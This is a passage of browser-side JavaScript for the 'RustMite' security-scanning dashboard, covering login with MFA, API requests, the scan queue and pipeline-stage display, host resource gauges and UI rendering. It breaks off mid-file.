(() => {
  const state = {
    view: "dashboard",
    hosts: [],
    hostById: {},
    findings: [],
    scans: [],
    checks: [],
    selectedCheckId: null,
    checkDetail: null,
    checkQuery: "",
    checkTypeFilter: "",
    checkSevFilter: "",
    checkEnabledFilter: "",
    nodes: [],
    activity: [],
    queue: null,
    summary: null,
    selectedFinding: null,
    hostPage: 0,
    findPage: 0,
    scanPage: 0,
    pageSize: 50,
    useUtc: localStorage.getItem("rustmite_clock_utc") !== "0",
    pollTimer: null,
    theme: localStorage.getItem("rustmite-theme") || "rustmite",
    metrics: null,
    settings: null,
    checkSets: null,
    dataSummary: null,
    version: null,
    ssh: null,
    _selectedSshKeys: [],
    virtualAgents: [],
    authUser: null,
    requireAuth: true,
    _authReady: false,
  };

  const SESSION_KEY = "rustmite_session";

  let _hostFilterTimer = 0;
  let _siftFilterTimer = 0;
  let _siftResultFilterTimer = 0;

  const THEMES = {
    rustmite: "RustMite",
    dark: "Dark",
    light: "Light",
    default: "Studio",
    unicorn: "Unicorn",
    rainbow: "Rainbow",
    nyan: "Nyan Cat",
  };

  const SCAN_STAGES = [
    "ssh connect",
    "deliver probe",
    "exec memfd",
    "collector: recon",
    "collector: process",
    "collector: file",
    "collector: cred",
    "stream observations",
    "evaluate checks",
    "sign results",
  ];

  const CHECK_SETS = [
    { id: "pulse", title: "Pulse", blurb: "Fast process / decloak / recon — seconds" },
    { id: "standard", title: "Standard", blurb: "Accounts, preload, modules, sockets, SSH keys, services" },
    { id: "deep", title: "Deep", blurb: "Full integrity, entropy, hidden dirs, sessions, containers" },
    { id: "incident", title: "Incident", blurb: "Same collectors as deep — highest priority IR triage" },
  ];

  const $ = (sel, el = document) => el.querySelector(sel);
  const $$ = (sel, el = document) => [...el.querySelectorAll(sel)];

  function sessionToken() {
    return localStorage.getItem(SESSION_KEY) || "";
  }

  function setSessionToken(v) {
    if (v) localStorage.setItem(SESSION_KEY, v);
    else localStorage.removeItem(SESSION_KEY);
  }

  function token() {
    return sessionToken()
      || localStorage.getItem("rustmite_api_token")
      || ($("#apiToken")?.value || "").trim();
  }

  function saveToken(v) {
    if (v) localStorage.setItem("rustmite_api_token", v);
    else localStorage.removeItem("rustmite_api_token");
  }

  function showLogin(show) {
    const overlay = $("#loginOverlay");
    const app = $("#app");
    if (overlay) {
      overlay.classList.toggle("hidden", !show);
      overlay.setAttribute("aria-hidden", show ? "false" : "true");
    }
    if (app) app.classList.toggle("hidden", !!show);
  }

  function updateSessionChrome() {
    const el = $("#sessionUser");
    const logout = $("#btnLogout");
    if (el) {
      el.textContent = state.authUser
        ? `${state.authUser.username} · ${state.authUser.role}${state.authUser.totp_enabled ? " · MFA" : ""}`
        : (state.requireAuth ? "" : "auth off");
    }
    if (logout) logout.classList.toggle("hidden", !state.authUser && !sessionToken());
  }

  async function fetchAuthStatus() {
    const res = await fetch("/v1/auth/status", { headers: { Accept: "application/json" } });
    if (!res.ok) return { require_auth: true };
    return res.json();
  }

  async function fetchMe() {
    const t = sessionToken();
    if (!t) return null;
    try {
      const res = await fetch("/v1/auth/me", {
        headers: { Accept: "application/json", Authorization: `Bearer ${t}` },
      });
      if (res.status === 401) {
        setSessionToken(null);
        return null;
      }
      if (!res.ok) return null;
      return res.json();
    } catch (_) {
      return null;
    }
  }

  async function ensureAuth() {
    const st = await fetchAuthStatus().catch(() => ({ require_auth: true }));
    state.requireAuth = !!st.require_auth;
    if (!state.requireAuth) {
      state.authUser = { username: "anonymous", role: "admin", totp_enabled: false };
      state._authReady = true;
      showLogin(false);
      updateSessionChrome();
      return true;
    }
    const me = await fetchMe();
    if (me) {
      state.authUser = me;
      state._authReady = true;
      showLogin(false);
      updateSessionChrome();
      return true;
    }
    state.authUser = null;
    state._authReady = false;
    showLogin(true);
    updateSessionChrome();
    return false;
  }

  function wireLoginForm() {
    const form = $("#loginForm");
    if (!form || form.dataset.wired) return;
    form.dataset.wired = "1";
    let challengeId = null;
    const errEl = $("#loginError");
    const cred = $("#loginCredFields");
    const mfa = $("#loginMfaFields");
    const submit = $("#loginSubmit");
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(form);
      if (errEl) {
        errEl.textContent = "";
        errEl.classList.add("hidden");
      }
      if (submit) submit.disabled = true;
      try {
        if (challengeId) {
          const res = await fetch("/v1/auth/mfa", {
            method: "POST",
            headers: { "Content-Type": "application/json", Accept: "application/json" },
            body: JSON.stringify({
              challenge_id: challengeId,
              code: String(fd.get("mfa_code") || "").trim(),
            }),
          });
          const data = await res.json().catch(() => ({}));
          if (!res.ok) throw new Error(data.message || data.detail || (typeof data === "string" ? data : "invalid code"));
          setSessionToken(data.token);
          state.authUser = data.user;
          challengeId = null;
          showLogin(false);
          updateSessionChrome();
          await loadAll();
          startPolling();
          render();
          return;
        }
        const res = await fetch("/v1/auth/login", {
          method: "POST",
          headers: { "Content-Type": "application/json", Accept: "application/json" },
          body: JSON.stringify({
            username: String(fd.get("username") || "").trim(),
            password: String(fd.get("password") || ""),
          }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) {
          const msg = typeof data === "string" ? data : (data.message || data.detail || "invalid credentials");
          throw new Error(msg);
        }
        if (data.mfa_required) {
          challengeId = data.challenge_id;
          if (cred) cred.classList.add("hidden");
          if (mfa) mfa.classList.remove("hidden");
          if (submit) submit.textContent = "Verify MFA";
          form.querySelector('[name="mfa_code"]')?.focus();
          return;
        }
        setSessionToken(data.token);
        state.authUser = data.user;
        showLogin(false);
        updateSessionChrome();
        await loadAll();
        startPolling();
        render();
      } catch (err) {
        if (errEl) {
          errEl.textContent = err.message || String(err);
          errEl.classList.remove("hidden");
        }
      } finally {
        if (submit) submit.disabled = false;
      }
    });
  }

  async function api(path, opts = {}) {
    const headers = { Accept: "application/json", ...(opts.headers || {}) };
    const t = token();
    if (t) headers.Authorization = `Bearer ${t}`;
    if (opts.body && !(opts.body instanceof FormData)) {
      headers["Content-Type"] = "application/json";
      opts.body = typeof opts.body === "string" ? opts.body : JSON.stringify(opts.body);
    }
    let res;
    try {
      res = await fetch(path, { ...opts, headers });
    } catch (err) {
      const msg = err && err.message ? String(err.message) : String(err || "network error");
      throw new Error(
        /failed to fetch|networkerror|load failed/i.test(msg)
          ? `Network error talking to ${path} (server overloaded, timed out, or restarted). Try Import tree for day folders, or retry with a smaller path.`
          : msg
      );
    }
    if (res.status === 401 && state.requireAuth && !path.startsWith("/v1/auth/")) {
      setSessionToken(null);
      state.authUser = null;
      showLogin(true);
      updateSessionChrome();
      throw new Error("Session expired — sign in again");
    }
    if (!res.ok) {
      let detail = "";
      try {
        const j = await res.json();
        detail = j.detail || j.message || (Array.isArray(j) && j[0]?.message
          ? j.map((x) => x.message).join("; ")
          : "") || j.title || "";
      } catch (_) {
        try {
          const t = await res.text();
          if (t) detail = t.slice(0, 400);
        } catch (__) {}
      }
      if (!detail) detail = res.statusText || `HTTP ${res.status}`;
      if (res.status === 413) {
        detail = detail && detail !== `HTTP ${res.status}`
          ? detail
          : "Upload too large for one request — try fewer files, or use a server-local path";
      }
      throw new Error(`${detail} (${res.status})`);
    }
    if (res.status === 204) return null;
    const ct = res.headers.get("content-type") || "";
    if (ct.includes("application/json")) return res.json();
    return res.text();
  }

  function toast(msg) {
    const el = document.createElement("div");
    el.className = "toast";
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(() => el.remove(), 2800);
  }

  function esc(s) {
    return String(s ?? "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function sev(s) {
    const v = (s || "info").toLowerCase();
    return `<span class="sev ${esc(v)}">${esc(v)}</span>`;
  }

  function shortId(id) {
    if (!id) return "—";
    const s = String(id);
    return s.length > 12 ? s.slice(0, 8) + "…" : s;
  }

  function hostName(id) {
    return state.hostById[id]?.display_name || shortId(id);
  }

  function fmtTime(iso) {
    if (!iso) return "—";
    try {
      const d = new Date(iso);
      if (Number.isNaN(d.getTime())) return String(iso).slice(0, 19);
      return state.useUtc
        ? d.toISOString().replace("T", " ").slice(0, 19)
        : d.toLocaleString(undefined, { hour12: false });
    } catch (_) {
      return String(iso).slice(0, 19);
    }
  }

  function pager(id, page, total, pageSize) {
    const pages = Math.max(1, Math.ceil(total / pageSize));
    const p = Math.min(page, pages - 1);
    return `<div class="toolbar" style="padding:0.75rem 1rem;border-top:1px solid var(--line)">
      <span class="muted">${total.toLocaleString()} rows · page ${p + 1}/${pages}</span>
      <button class="btn ghost" data-page="${id}" data-dir="-1" ${p <= 0 ? "disabled" : ""}>Prev</button>
      <button class="btn ghost" data-page="${id}" data-dir="1" ${p >= pages - 1 ? "disabled" : ""}>Next</button>
    </div>`;
  }

  function profileBars(map) {
    const entries = Object.entries(map || {}).sort((a, b) => b[1] - a[1]);
    if (!entries.length) return `<div class="empty">No profile data</div>`;
    const max = Math.max(...entries.map(([, n]) => n), 1);
    return `<div style="padding:0.85rem 1.1rem;display:grid;gap:0.45rem">
      ${entries.map(([k, n]) => `
        <div style="display:grid;grid-template-columns:140px 1fr 48px;gap:0.5rem;align-items:center;font-size:0.85rem">
          <span class="mono">${esc(k)}</span>
          <div style="background:var(--ring-track);border-radius:999px;height:8px;overflow:hidden">
            <div style="width:${(n / max) * 100}%;height:100%;background:linear-gradient(90deg,var(--accent),var(--accent-deep))"></div>
          </div>
          <span class="muted" style="text-align:right">${n}</span>
        </div>`).join("")}
    </div>`;
  }

  function activeCount(q) {
    if (!q) return 0;
    return (q.queued || 0) + (q.leased || 0) + (q.running || 0);
  }

  function updateClock() {
    const now = new Date();
    $("#clockTime").textContent = state.useUtc
      ? now.toISOString().replace("T", " ").slice(0, 19)
      : now.toLocaleString(undefined, { hour12: false });
    $("#clockTz").textContent = state.useUtc ? "UTC" : "Local";
  }

  function updateQueueBadge() {
    const q = state.queue || {};
    const n = activeCount(q);
    const btn = $("#btnQueue");
    const label = $("#queueLabel");
    label.textContent = n > 0
      ? `Queue ${n} · ${q.running || 0} run`
      : `Queue ${q.complete ? "idle" : 0}`;
    btn.classList.toggle("active", n > 0);
  }

  function fmtBytes(n) {
    const v = Number(n) || 0;
    if (v < 1024) return `${v} B`;
    const u = ["KB", "MB", "GB", "TB"];
    let x = v / 1024;
    let i = 0;
    while (x >= 1024 && i < u.length - 1) { x /= 1024; i++; }
    return `${x.toFixed(x >= 10 ? 0 : 1)} ${u[i]}`;
  }

  function fmtUptime(secs) {
    const s = Math.max(0, Math.floor(Number(secs) || 0));
    const d = Math.floor(s / 86400);
    const h = Math.floor((s % 86400) / 3600);
    const m = Math.floor((s % 3600) / 60);
    if (d > 0) return `${d}d ${h}h`;
    if (h > 0) return `${h}h ${m}m`;
    return `${m}m`;
  }

  function setGauge(kind, pct, label, sub) {
    const wrap = $(`.host-gauge[data-res="${kind}"]`);
    const ids = {
      cpu: ["resCpuPct", "resCpuBar", "resCpuSub"],
      mem: ["resMemPct", "resMemBar", "resMemSub"],
      disk: ["resDiskPct", "resDiskBar", "resDiskSub"],
    };
    const [pctId, barId, subId] = ids[kind] || [];
    if (!pctId) return;
    const p = Math.max(0, Math.min(100, Math.round(Number(pct) || 0)));
    $(`#${pctId}`).textContent = label ?? `${p}%`;
    $(`#${barId}`).style.width = `${p}%`;
    $(`#${subId}`).textContent = sub || "—";
    if (wrap) {
      wrap.classList.toggle("warn", p >= 70 && p < 90);
      wrap.classList.toggle("crit", p >= 90);
    }
  }

  function renderHostResources() {
    const m = state.metrics;
    if (!m) return;
    setGauge(
      "cpu",
      m.cpu_pct,
      `${(m.cpu_pct || 0).toFixed(1)}%`,
      m.scope === "process"
        ? `pid ${m.pid || "?"} · ${m.process_name || "server"} · ${m.cpu_cores || "?"} cores`
        : `${m.cpu_cores || "?"} cores · load ${Number(m.load_avg_1 || 0).toFixed(2)}`
    );
    setGauge(
      "mem",
      m.mem_pct,
      `${Math.round(m.mem_pct || 0)}%`,
      m.scope === "process"
        ? `RSS ${fmtBytes(m.mem_used_bytes)} / host ${fmtBytes(m.mem_total_bytes)}`
        : `${fmtBytes(m.mem_used_bytes)} / ${fmtBytes(m.mem_total_bytes)}`
    );
    const disks = m.disks || [];
    const primary =
      disks.find((d) => d.mount === "/" || d.mount === "/System/Volumes/Data") || disks[0];
    const diskMount = primary?.mount || "/";
    setGauge(
      "disk",
      m.disk_pct,
      m.scope === "process"
        ? `${fmtBytes(m.disk_io_bps || 0)}/s`
        : `${Math.round(m.disk_pct || 0)}%`,
      m.scope === "process"
        ? `R ${fmtBytes(m.disk_read_bytes || 0)} · W ${fmtBytes(m.disk_written_bytes || 0)}`
        : `${fmtBytes((m.disk_total_bytes || 0) - (m.disk_available_bytes || 0))} / ${fmtBytes(m.disk_total_bytes)} · ${diskMount}`
    );
    const name = $("#hostResName");
    if (name) {
      const scope = m.scope === "process" ? "process" : "host";
      name.textContent = `${m.hostname || "server"} · ${scope} · up ${fmtUptime(m.process_uptime_secs || m.uptime_secs)}`;
    }
  }

  function shortTime(iso) {
    if (!iso) return "—";
    try {
      const d = new Date(iso);
      if (Number.isNaN(d.getTime())) return String(iso).slice(11, 19) || "—";
      const s = state.useUtc ? d.toISOString() : d.toTimeString();
      return state.useUtc ? s.slice(11, 19) : s.slice(0, 8);
    } catch (_) {
      return "—";
    }
  }

  function scanPhase(job) {
    const st = String(job?.state || "").toLowerCase();
    const stage = String(job?.progress_stage || "").toLowerCase();
    const pct = Number(job?.progress_pct);
    if (st === "queued") return { id: "queued", label: "Queued", icon: "◇" };
    if (st === "leased" || stage.includes("lease")) return { id: "lease", label: "Leased", icon: "◈" };
    if (
      stage.includes("ssh connect")
      || stage.includes("resolve credential")
      || stage.includes("handshake")
      || stage.includes("auth")
      || (st === "running" && (!Number.isFinite(pct) || pct < 20))
    ) {
      return { id: "connect", label: "Connecting", icon: "◎" };
    }
    if (
      stage.includes("deliver")
      || stage.includes("probe")
      || stage.includes("exec")
      || (Number.isFinite(pct) && pct >= 20 && pct < 45)
    ) {
      return { id: "deliver", label: "Delivering", icon: "⟶" };
    }
    if (
      stage.includes("stream")
      || stage.includes("collector")
      || stage.includes("observ")
      || (Number.isFinite(pct) && pct >= 45 && pct < 95)
    ) {
      return { id: "collect", label: "Collecting", icon: "◉" };
    }
    if (stage.includes("post result") || stage.includes("complete") || pct >= 95) {
      return { id: "finish", label: "Finishing", icon: "✦" };
    }
    if (st === "running") return { id: "connect", label: "Scanning", icon: "◎" };
    return { id: st || "queued", label: st || "queued", icon: "·" };
  }

  function renderLiveStrip() {
    const strip = $("#liveStrip");
    const jobsEl = $("#liveJobs");
    const logEl = $("#liveLog");
    const sum = $("#liveSummary");
    const title = $("#liveTitle");
    const q = state.queue || {};
    const active = q.active || [];
    const n = activeCount(q);
    const running = q.running || 0;
    const connecting = active.some((j) => {
      const p = scanPhase(j).id;
      return p === "connect" || p === "lease" || p === "deliver";
    });
    strip.classList.toggle("idle", n === 0);
    strip.classList.toggle("scanning", n > 0);
    strip.classList.toggle("connecting", connecting);
    if (title) {
      title.textContent = n === 0
        ? "Scan queue idle"
        : connecting
          ? "Establishing host links"
          : "Scanning in progress";
    }
    sum.textContent = n === 0
      ? "waiting for work — simulator will top up shortly"
      : connecting
        ? `${running || active.length} tunnel${(running || active.length) === 1 ? "" : "s"} lighting up · ${active.length} active`
        : `${running} host${running === 1 ? "" : "s"} scanning now · ${active.length} active job${active.length === 1 ? "" : "s"}`;

    const setMetric = (k, v) => {
      const el = $(`.live-metric[data-k="${k}"] em`);
      if (el) el.textContent = String(v);
    };
    setMetric("queued", q.queued || 0);
    setMetric("leased", q.leased || 0);
    setMetric("running", running);
    const runMetric = $(`.live-metric[data-k="running"]`);
    if (runMetric) runMetric.classList.toggle("hot", running > 0);

    const jobCount = $("#liveJobCount");
    if (jobCount) jobCount.textContent = String(active.length);

    const overall = $("#liveOverall");
    const fill = $("#liveOverallFill");
    const pctLabel = $("#liveOverallPct");
    if (active.length) {
      const avg = Math.round(
        active.reduce((a, j) => a + (j.progress_pct ?? (j.state === "queued" ? 0 : 5)), 0) / active.length
      );
      overall.hidden = false;
      fill.style.width = `${avg}%`;
      pctLabel.textContent = `${avg}% avg`;
    } else {
      overall.hidden = true;
      fill.style.width = "0%";
      pctLabel.textContent = "0%";
    }

    if (!active.length) {
      jobsEl.innerHTML = `<div class="live-empty">No active scan jobs</div>`;
    } else {
      jobsEl.innerHTML = active.slice(0, 10).map((j) => {
        const pct = j.progress_pct ?? (j.state === "queued" ? 0 : 5);
        const stage = j.progress_stage || j.state || "…";
        const st = (j.state || "queued").toLowerCase();
        const phase = scanPhase(j);
        const host = hostName(j.host_id);
        const hrec = state.hostById?.[j.host_id];
        const addr = hrec?.primary_addr ? `${hrec.primary_addr}:${hrec.ssh_port || 22}` : "";
        const lit = (ids) => (ids.includes(phase.id) ? "on" : "");
        return `<div class="live-job phase-${esc(phase.id)}" data-phase="${esc(phase.id)}" title="${esc(stage)}">
          <div class="live-orb" style="--pct:${pct}%">
            <div class="live-orb-halo"></div>
            <div class="live-orb-ring"></div>
            <div class="live-orb-ring live-orb-ring-2"></div>
            <div class="live-orb-core"><span>${pct}%</span></div>
            <div class="live-orb-beam" aria-hidden="true"></div>
            <div class="live-orb-spark" aria-hidden="true"></div>
          </div>
          <div class="live-job-main">
            <div class="live-job-topline">
              <strong>${esc(host)}</strong>
              <span class="live-phase-chip">${esc(phase.icon)} ${esc(phase.label)}</span>
            </div>
            <div class="meta">${esc(j.check_set)}${addr ? ` · ${esc(addr)}` : ""} · ${esc(stage)}</div>
            <div class="live-rail">
              <div class="live-rail-track"><span style="width:${pct}%"></span></div>
              <div class="live-rail-sheen" aria-hidden="true"></div>
            </div>
            <div class="live-phase-dots" aria-hidden="true">
              <i class="${lit(["queued","lease","connect","deliver","collect","finish"])}"></i>
              <i class="${lit(["lease","connect","deliver","collect","finish"])}"></i>
              <i class="${lit(["connect","deliver","collect","finish"])}"></i>
              <i class="${lit(["deliver","collect","finish"])}"></i>
              <i class="${lit(["collect","finish"])}"></i>
              <i class="${lit(["finish"])}"></i>
            </div>
          </div>
          <span class="live-job-state ${esc(st)}">${esc(st)}</span>
        </div>`;
      }).join("");
    }

    const lines = (state.activity || []).slice(0, 14);
    if (!lines.length) {
      logEl.innerHTML = `<div class="live-empty">No stage events yet</div>`;
    } else {
      logEl.innerHTML = lines.map((e) => {
        const lvl = (e.level || "info").toLowerCase();
        const host = e.host_id ? hostName(e.host_id) : "";
        const msg = host ? `${e.message} · ${host}` : e.message;
        return `<div class="line ${esc(lvl)}" title="${esc(e.kind)} — ${esc(msg)}">
          <span class="ts">${esc(shortTime(e.ts))}</span>
          <span class="lvl">${esc(lvl)}</span>
          <span class="msg">${esc(msg)}</span>
        </div>`;
      }).join("");
    }
    renderHostResources();
  }

  function setTheme(id) {
    const theme = THEMES[id] ? id : "rustmite";
    state.theme = theme;
    document.documentElement.setAttribute("data-theme", theme);
    localStorage.setItem("rustmite-theme", theme);
    const label = $("#themeLabel");
    if (label) label.textContent = THEMES[theme];
    $$(".theme-option").forEach((opt) => {
      opt.classList.toggle("active", opt.dataset.theme === theme);
    });
    const overlay = $("#nyanOverlay");
    if (overlay) {
      if (theme === "nyan") {
        overlay.classList.add("visible");
        if (!overlay.querySelector(".nyan-cat")) {
          const cat = document.createElement("div");
          cat.className = "nyan-cat";
          cat.textContent = "🌈🐱💨";
          overlay.appendChild(cat);
        }
        overlay.setAttribute("aria-hidden", "false");
      } else {
        overlay.classList.remove("visible");
        overlay.setAttribute("aria-hidden", "true");
      }
    }
  }

  function statusGraph() {
    const cols = Array.from({ length: 24 }, () => ({ alert: 0, pass: 0 }));
    const now = Date.now();
    for (const s of state.scans || []) {
      const m = s.meta || {};
      const t = Date.parse(m.finished_at || m.started_at || "") || 0;
      if (!t) continue;
      const hoursAgo = Math.floor((now - t) / 3600000);
      if (hoursAgo < 0 || hoursAgo >= 24) continue;
      const col = 23 - hoursAgo;
      const fired = m.fired ?? (s.findings || []).length;
      if (fired > 0 || String(s.job?.state || "").includes("fail")) cols[col].alert += 1;
      else cols[col].pass += 1;
    }
    for (const e of state.activity || []) {
      if (e.level === "warn" || e.level === "error") cols[23].alert += 1;
      else if (e.kind?.startsWith("scan.") && e.level === "info") cols[23].pass += 0.15;
    }
    const max = Math.max(1, ...cols.map((c) => c.alert + c.pass));
    return `<div class="status-graph" title="Last 24h scan outcomes (green=pass, red=alert)">
      ${cols.map((c) => {
        const ah = Math.round((c.alert / max) * 100);
        const ph = Math.round((c.pass / max) * 100);
        return `<div class="col">
          <div class="alert" style="height:${Math.max(c.alert ? 4 : 0, ah)}%"></div>
          <div class="pass" style="height:${Math.max(c.pass ? 4 : 0, ph)}%"></div>
        </div>`;
      }).join("")}
    </div>`;
  }

  function stageHotSet() {
    const hot = new Set();
    for (const j of state.queue?.active || []) {
      const stage = (j.progress_stage || "").toLowerCase();
      for (const s of SCAN_STAGES) {
        if (stage.includes(s.split(":")[0].trim()) || stage.includes(s)) hot.add(s);
      }
      if (stage.includes("memfd") || stage.includes("anonymous fd")) hot.add("exec memfd");
      if (stage.includes("deliver") || stage.includes("probe")) hot.add("deliver probe");
      if (stage.includes("ssh")) hot.add("ssh connect");
      if (stage.includes("stream") || stage.includes("ndjson")) hot.add("stream observations");
      if (stage.includes("evaluat") || stage.includes("check")) hot.add("evaluate checks");
      if (stage.includes("sign") || stage.includes("normalise")) hot.add("sign results");
      if (stage.includes("decloak") || stage.includes("process")) hot.add("collector: process");
      if (stage.includes("file") || stage.includes("integrity")) hot.add("collector: file");
      if (stage.includes("cred") || stage.includes("shadow")) hot.add("collector: cred");
      if (stage.includes("recon")) hot.add("collector: recon");
    }
    return hot;
  }

  function scanCommandCenter() {
    const q = state.queue || {};
    const active = q.active || [];
    const n = activeCount(q);
    const running = q.running || 0;
    const pct = n ? Math.round((running / Math.max(n, 1)) * 100) : 0;
    const hot = stageHotSet();
    const cards = active.slice(0, 8).map((j) => {
      const p = j.progress_pct ?? (j.state === "queued" ? 0 : 5);
      const phase = scanPhase(j);
      return `<div class="scan-card phase-${esc(phase.id)}">
        <div class="scan-card-head">
          <strong>${esc(hostName(j.host_id))}</strong>
          <span class="live-phase-chip">${esc(phase.icon)} ${esc(phase.label)}</span>
        </div>
        <div class="stage">${esc(j.check_set)} · ${esc(j.progress_stage || "waiting")}</div>
        <div class="live-rail">
          <div class="live-rail-track"><span style="width:${p}%"></span></div>
          <div class="live-rail-sheen" aria-hidden="true"></div>
        </div>
        <div class="pct">${p}% complete</div>
      </div>`;
    }).join("");

    return `
      <div class="scan-center">
        <div class="grid-scan">
          <section class="panel scan-ring-panel">
            <div class="panel-head"><h3>Queue load</h3><button class="btn ghost" data-goto="queue">Open</button></div>
            <div class="scan-ring-wrap">
              <div class="scan-ring" style="--pct:${pct}%">
                <div class="scan-ring-inner">
                  <div class="big">${n}</div>
                  <div class="sub">active</div>
                </div>
              </div>
              <div class="queue-legend">
                <span><i class="q"></i>${q.queued || 0} queued</span>
                <span><i class="l"></i>${q.leased || 0} leased</span>
                <span><i class="r"></i>${running} running</span>
                <span><i class="f"></i>${q.failed || 0} failed</span>
              </div>
            </div>
          </section>
          <section class="panel">
            <div class="panel-head"><h3>Pipeline stages</h3><span class="muted">${hot.size} hot</span></div>
            <div class="stage-rail">
              ${SCAN_STAGES.map((s) =>
                `<span class="stage-chip${hot.has(s) ? " hot" : ""}">${esc(s)}</span>`
              ).join("")}
            </div>
            <div class="panel-head" style="border-top:1px solid var(--line)"><h3>Status graph</h3><span class="muted">24h</span></div>
            ${statusGraph()}
          </section>
          <section class="panel">
            <div class="panel-head"><h3>Active scans</h3><button class="btn ghost" data-goto="activity">Logs</button></div>
            ${cards
              ? `<div class="scan-cards">${cards}</div>`
              : `<div class="empty">No active scans — queue will top up automatically</div>`}
          </section>
        </div>
      </div>`;
  }

  async function loadLive() {
    const [activity, queue, metrics, hosts] = await Promise.all([
      api("/v1/activity?limit=200"),
      api("/v1/queue"),
      api("/v1/metrics").catch(() => null),
      api("/v1/hosts").catch(() => null),
    ]);
    state.activity = activity || [];
    state.queue = queue || null;
    if (metrics) state.metrics = metrics;
    if (hosts) {
      state.hosts = hosts;
      state.hostById = Object.fromEntries(state.hosts.map((h) => [h.id, h]));
    }
    updateQueueBadge();
    renderLiveStrip();
    // Avoid full re-render while the user is typing in a filter box (poll would
    // recreate the input and race with debounce timers).
    const ae = document.activeElement;
    const typingFilter = ae && (
      ae.id === "hostQ"
      || ae.id === "siftHostQ"
      || ae.id === "siftTag"
      || ae.id === "siftResultQ"
      || ae.id === "checkQ"
      || ae.id === "anomarkHostQ"
      || ae.id === "anomarkHostTag"
      || ae.id === "anomarkAutoHostQ"
      || ae.id === "anomarkAutoHostTag"
      || ae.id === "anomarkTrainHostQ"
      || ae.id === "anomarkTrainHostTag"
    );
    if (typingFilter) return;
    if (
      state.view === "queue"
      || state.view === "activity"
      || state.view === "dashboard"
      || state.view === "hosts"
    ) {
      render();
    }
  }

  async function loadAll() {
    const [summary, hosts, findings, scans, checks, nodes, health, activity, queue, metrics, settings, version, checkSets, virtAgents] = await Promise.all([
      api("/v1/summary"),
      api("/v1/hosts"),
      api("/v1/findings?limit=20000"),
      api("/v1/scans?limit=5000"),
      api("/v1/checks"),
      api("/v1/nodes"),
      api("/v1/health").catch(() => ({ status: "error" })),
      api("/v1/activity?limit=200").catch(() => []),
      api("/v1/queue").catch(() => null),
      api("/v1/metrics").catch(() => null),
      api("/v1/settings").catch(() => null),
      api("/v1/version").catch(() => null),
      api("/v1/check-sets").catch(() => null),
      api("/v1/virtual-agents").catch(() => null),
    ]);
    state.summary = summary;
    state.hosts = hosts || [];
    state.hostById = Object.fromEntries(state.hosts.map((h) => [h.id, h]));
    state.findings = findings || [];
    state.scans = scans || [];
    state.checks = checks || [];
    state.nodes = nodes || [];
    state.activity = activity || [];
    state.queue = queue;
    if (metrics) state.metrics = metrics;
    if (settings) state.settings = settings;
    if (version) state.version = version;
    if (checkSets) state.checkSets = checkSets;
    if (virtAgents && Array.isArray(virtAgents.profiles)) {
      state.virtualAgents = virtAgents.profiles;
    } else if (Array.isArray(virtAgents)) {
      state.virtualAgents = virtAgents;
    }
    if (String(state.view || "").startsWith("ssh-")) {
      await loadSshHunter().catch(() => {});
    }
    const pill = $("#healthPill");
    if (health && health.status === "ok") {
      const cpu = Math.round(health.cpu_pct ?? metrics?.cpu_pct ?? 0);
      const mem = Math.round(health.mem_pct ?? metrics?.mem_pct ?? 0);
      const ver = version?.server?.version || health.version || settings?.effective?.version || "";
      pill.textContent = ver
        ? `healthy · v${ver}`
        : "API healthy";
      pill.title = `CPU ${cpu}% · MEM ${mem}% · ${(summary?.hosts || 0).toLocaleString()} hosts`;
      pill.className = "health ok";
    } else {
      pill.textContent = "API unreachable";
      pill.className = "health bad";
    }
    updateQueueBadge();
    renderLiveStrip();
    render();
  }

  function openDrawer(title, html, opts) {
    const panel = $("#drawer .drawer-panel");
    const mode = (opts && opts.mode) || "default";
    if (panel) {
      panel.classList.toggle("is-wide", mode === "wide");
      panel.classList.toggle("is-fullscreen", mode === "fullscreen");
    }
    $("#drawerTitle").textContent = title;
    $("#drawerBody").innerHTML = html;
    $("#drawer").classList.remove("hidden");
    $("#drawer").setAttribute("aria-hidden", "false");
  }

  function closeDrawer() {
    $("#drawer").classList.add("hidden");
    $("#drawer").setAttribute("aria-hidden", "true");
    const panel = $("#drawer .drawer-panel");
    if (panel) {
      panel.classList.remove("is-wide", "is-fullscreen");
    }
    state.selectedFinding = null;
    const hash = String(location.hash || "");
    // Scan detail is a full page that owns `#/scans/…` — don't clobber it when closing a drawer.
    if (hash.startsWith("#finding/")) {
      const next = `#/${state.view || "findings"}`;
      history.replaceState(null, "", next);
    }
  }

  function openModal(title, html) {
    $("#modalTitle").textContent = title;
    $("#modalBody").innerHTML = html;
    $("#modal").classList.remove("hidden");
    $("#modal").setAttribute("aria-hidden", "false");
  }

  function closeModal() {
    $("#modal").classList.add("hidden");
    $("#modal").setAttribute("aria-hidden", "true");
  }

  async function loadSshHunter() {
    const [summary, keys, users, hosts, graph, tags, zones] = await Promise.all([
      api("/v1/ssh/summary"),
      api("/v1/ssh/keys?limit=2000"),
      api("/v1/ssh/users?limit=2000"),
      api("/v1/ssh/hosts?limit=2000"),
      api("/v1/ssh/graph?limit=120"),
      api("/v1/ssh/tags"),
      api("/v1/ssh/zones"),
    ]);
    state.ssh = {
      summary,
      keys: keys.keys || [],
      users: users.users || [],
      hosts: hosts.hosts || [],
      graph,
      tags: tags.tags || [],
      zones: zones.zones || [],
    };
  }

  function setSshHunterOpen(open) {
    const group = $("#navSshHunter");
    if (!group) return;
    group.classList.toggle("open", !!open);
    const sub = group.querySelector(".nav-sub");
    if (sub) sub.hidden = !open;
    const toggle = group.querySelector(".nav-group-toggle");
    if (toggle) toggle.setAttribute("aria-expanded", String(!!open));
  }

  function setView(view, opts) {
    state.view = view;
    const skipHash = opts && opts.skipHash;
    const isSsh = String(view).startsWith("ssh-");
    $$(".nav-item").forEach((b) => {
      const active = b.dataset.view === view
        || (view === "scan-detail" && b.dataset.view === "scans");
      b.classList.toggle("active", active);
    });
    const group = $("#navSshHunter");
    if (group) {
      const toggle = group.querySelector(".nav-group-toggle");
      if (toggle) toggle.classList.toggle("active", isSsh);
      // Keep SSH Hunter collapsed unless an SSH view is active.
      setSshHunterOpen(isSsh);
    }
    const titles = {
      dashboard: ["Dashboard", "Fleet posture, live queue, and status graph"],
      findings: ["Findings", "Alert events with forensic evidence — Sandfly Results Viewer equivalent"],
      hosts: ["Hosts Management", "Add, view, update, and delete monitored hosts"],
